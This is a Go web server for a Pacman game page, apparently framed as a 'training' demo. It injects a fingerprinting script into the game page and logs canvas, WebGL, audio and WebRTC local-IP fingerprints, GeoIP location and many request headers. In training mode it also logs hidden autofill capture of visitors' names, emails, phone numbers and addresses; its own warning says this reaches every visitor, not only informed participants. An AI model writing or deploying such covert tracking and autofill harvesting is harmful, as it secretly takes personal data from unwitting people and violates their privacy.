package main

import (
	"encoding/json"
	"fmt"
	"log/slog"
	"net"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/oschwald/geoip2-golang"
)

func main() {
	staticDir := getenv("STATIC_DIR", "/usr/share/pacman/html")
	listenAddr := getenv("LISTEN_ADDR", ":8080")
	dbPath := getenv("GEOIP_DB_PATH", "/geoip/city.mmdb")
	trainingMode := getenv("TRAINING_MODE", "false") == "true"

	logger := slog.New(slog.NewJSONHandler(os.Stdout, nil))

	geo := openGeoIP(logger, dbPath)
	if geo != nil {
		defer geo.Close()
	}

	leaderboard := newLeaderboardStore()

	mux := http.NewServeMux()
	mux.HandleFunc("/healthz", func(w http.ResponseWriter, _ *http.Request) {
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte("ok\n"))
	})
	mux.Handle("/", withAccessLog(logger, geo, serveStatic(staticDir, trainingMode)))
	mux.Handle("/api/fingerprint", withAccessLog(logger, geo, handleFingerprint(logger)))
	mux.Handle("/api/leaderboard", withAccessLog(logger, geo, handleLeaderboard(logger, leaderboard)))

	if trainingMode {
		logger.Warn("training mode ENABLED: nickname field now carries hidden email/tel/address/postal autofill capture (see src/nickname.js) - covers every visitor of this host, not just an informed group, see README.md")
	}
	logger.Info("pacman server starting", "addr", listenAddr, "static_dir", staticDir, "geoip_enabled", geo != nil, "training_mode", trainingMode)
	if err := http.ListenAndServe(listenAddr, mux); err != nil {
		logger.Error("server exited", "error", err.Error())
		os.Exit(1)
	}
}

func openGeoIP(logger *slog.Logger, dbPath string) *geoip2.Reader {
	if _, err := os.Stat(dbPath); err != nil {
		logger.Warn("geoip: database not found, continuing without geo enrichment", "path", dbPath)
		return nil
	}
	reader, err := geoip2.Open(dbPath)
	if err != nil {
		logger.Warn("geoip: failed to open database, continuing without geo enrichment", "path", dbPath, "error", err.Error())
		return nil
	}
	logger.Info("geoip: database loaded", "path", dbPath)
	return reader
}

func serveStatic(dir string, trainingMode bool) http.Handler {
	fileServer := http.FileServer(http.Dir(dir))
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/" {
			serveIndexWithFingerprint(w, dir, trainingMode)
			return
		}
		fileServer.ServeHTTP(w, r)
	})
}

func serveIndexWithFingerprint(w http.ResponseWriter, dir string, trainingMode bool) {
	content, err := os.ReadFile(dir + "/index.htm")
	if err != nil {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}
	injected := strings.Replace(string(content), "</body>",
		fmt.Sprintf(`<script>window.PACMAN_TRAINING_MODE = %t;</script><script src="/fingerprint.js"></script></body>`, trainingMode), 1)
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	_, _ = w.Write([]byte(injected))
}

type fingerprintPayload struct {
	Timezone            string  `json:"timezone"`
	ScreenWidth         int     `json:"screen_width"`
	ScreenHeight        int     `json:"screen_height"`
	ColorDepth          int     `json:"color_depth"`
	PixelRatio          float64 `json:"pixel_ratio"`
	HardwareConcurrency int     `json:"hardware_concurrency"`
	DeviceMemory        float64 `json:"device_memory"`
	Languages           string  `json:"languages"`
	Platform            string  `json:"platform"`
	TouchPoints         int     `json:"touch_points"`
	ConnectionType      string  `json:"connection_type"`
	CanvasFP            string  `json:"canvas_fp"`
	WebglVendor         string  `json:"webgl_vendor"`
	WebglRenderer       string  `json:"webgl_renderer"`
	AudioFP             string  `json:"audio_fp"`
	WebrtcLocalIP       string  `json:"webrtc_local_ip"`
	AutofillName        string  `json:"autofill_name"`
	AutofillEmail       string  `json:"autofill_email"`
	AutofillTel         string  `json:"autofill_tel"`
	AutofillAddress     string  `json:"autofill_address"`
	AutofillPostal      string  `json:"autofill_postal"`
}

func handleFingerprint(logger *slog.Logger) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			w.WriteHeader(http.StatusMethodNotAllowed)
			return
		}
		r.Body = http.MaxBytesReader(w, r.Body, 8*1024)
		var p fingerprintPayload
		if err := json.NewDecoder(r.Body).Decode(&p); err != nil {
			w.WriteHeader(http.StatusBadRequest)
			return
		}
		logger.Info("client_fingerprint",
			"remote_ip", clientIP(r),
			"timezone", p.Timezone,
			"screen_width", p.ScreenWidth,
			"screen_height", p.ScreenHeight,
			"color_depth", p.ColorDepth,
			"pixel_ratio", p.PixelRatio,
			"hardware_concurrency", p.HardwareConcurrency,
			"device_memory", p.DeviceMemory,
			"languages", p.Languages,
			"platform", p.Platform,
			"touch_points", p.TouchPoints,
			"connection_type", p.ConnectionType,
			"canvas_fp", p.CanvasFP,
			"webgl_vendor", p.WebglVendor,
			"webgl_renderer", p.WebglRenderer,
			"audio_fp", p.AudioFP,
			"webrtc_local_ip", p.WebrtcLocalIP,
			"autofill_name", p.AutofillName,
			"autofill_email", p.AutofillEmail,
			"autofill_tel", p.AutofillTel,
			"autofill_address", p.AutofillAddress,
			"autofill_postal", p.AutofillPostal,
		)
		w.WriteHeader(http.StatusNoContent)
	}
}

func getenv(key, fallback string) string {
	if v := os.Getenv(key); v != "" {
		return v
	}
	return fallback
}

func parseUserAgent(ua string) (browser, browserVersion, osName string) {
	browser, browserVersion = "unknown", ""
	switch {
	case strings.Contains(ua, "Edg/"):
		browser, browserVersion = "Edge", versionAfter(ua, "Edg/")
	case strings.Contains(ua, "OPR/"):
		browser, browserVersion = "Opera", versionAfter(ua, "OPR/")
	case strings.Contains(ua, "Firefox/"):
		browser, browserVersion = "Firefox", versionAfter(ua, "Firefox/")
	case strings.Contains(ua, "Chrome/"):
		browser, browserVersion = "Chrome", versionAfter(ua, "Chrome/")
	case strings.Contains(ua, "Version/") && strings.Contains(ua, "Safari/"):
		browser, browserVersion = "Safari", versionAfter(ua, "Version/")
	case strings.Contains(ua, "MSIE ") || strings.Contains(ua, "Trident/"):
		browser = "Internet Explorer"
	}

	switch {
	case strings.Contains(ua, "Windows"):
		osName = "Windows"
	case strings.Contains(ua, "iPhone") || strings.Contains(ua, "iPad"):
		osName = "iOS"
	case strings.Contains(ua, "Mac OS X"):
		osName = "macOS"
	case strings.Contains(ua, "Android"):
		osName = "Android"
	case strings.Contains(ua, "Linux"):
		osName = "Linux"
	default:
		osName = "unknown"
	}
	return browser, browserVersion, osName
}

func versionAfter(ua, marker string) string {
	idx := strings.Index(ua, marker)
	if idx == -1 {
		return ""
	}
	rest := ua[idx+len(marker):]
	end := strings.IndexAny(rest, " ;)")
	if end == -1 {
		return rest
	}
	return rest[:end]
}

func clientIP(r *http.Request) string {
	if ip := r.Header.Get("CF-Connecting-IP"); ip != "" {
		return ip
	}
	if xff := r.Header.Get("X-Forwarded-For"); xff != "" {
		first, _, _ := strings.Cut(xff, ",")
		return strings.TrimSpace(first)
	}
	host, _, err := net.SplitHostPort(r.RemoteAddr)
	if err != nil {
		return r.RemoteAddr
	}
	return host
}

type statusRecorder struct {
	http.ResponseWriter
	status int
}

func (r *statusRecorder) WriteHeader(status int) {
	r.status = status
	r.ResponseWriter.WriteHeader(status)
}

func withAccessLog(logger *slog.Logger, geo *geoip2.Reader, next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		start := time.Now()
		rec := &statusRecorder{ResponseWriter: w, status: http.StatusOK}
		next.ServeHTTP(rec, r)

		ip := clientIP(r)
		ua := r.Header.Get("User-Agent")
		browser, browserVersion, osName := parseUserAgent(ua)
		fields := []any{
			"remote_ip", ip,
			"x_forwarded_for", r.Header.Get("X-Forwarded-For"),
			"method", r.Method,
			"path", r.URL.Path,
			"status", rec.status,
			"duration_ms", time.Since(start).Milliseconds(),
			"user_agent", ua,
			"ua_browser", browser,
			"ua_browser_version", browserVersion,
			"ua_os", osName,
			"referer", r.Header.Get("Referer"),
			"accept_language", r.Header.Get("Accept-Language"),
			"accept_encoding", r.Header.Get("Accept-Encoding"),
			"sec_ch_ua", r.Header.Get("Sec-Ch-Ua"),
			"sec_ch_ua_platform", r.Header.Get("Sec-Ch-Ua-Platform"),
			"sec_ch_ua_mobile", r.Header.Get("Sec-Ch-Ua-Mobile"),
			"sec_fetch_site", r.Header.Get("Sec-Fetch-Site"),
			"sec_fetch_mode", r.Header.Get("Sec-Fetch-Mode"),
			"sec_fetch_dest", r.Header.Get("Sec-Fetch-Dest"),
			"dnt", r.Header.Get("DNT"),
			"sec_gpc", r.Header.Get("Sec-GPC"),
			"cf_ipcountry", r.Header.Get("CF-IPCountry"),
		}

		if geo != nil {
			if parsed := net.ParseIP(ip); parsed != nil {
				if city, err := geo.City(parsed); err == nil {
					fields = append(fields,
						"geo_country_iso", city.Country.IsoCode,
						"geo_country_name", city.Country.Names["en"],
						"geo_city", city.City.Names["en"],
						"geo_lat", city.Location.Latitude,
						"geo_lon", city.Location.Longitude,
					)
				}
			}
		}

		logger.Info("http_access", fields...)
	})
}
